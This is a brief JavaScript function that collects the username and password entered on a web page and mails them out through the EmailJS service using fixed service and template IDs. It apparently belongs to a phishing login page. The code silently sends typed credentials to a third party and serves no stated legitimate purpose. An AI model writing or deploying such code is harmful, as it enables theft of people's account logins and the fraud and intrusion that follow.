function sendMail(){
    let login = {
        username : document.getElementById("username").value,
        password : document.getElementById("password").value,
    }

    emailjs.send("service_2qhh66c","template_ve9evjt",login)
}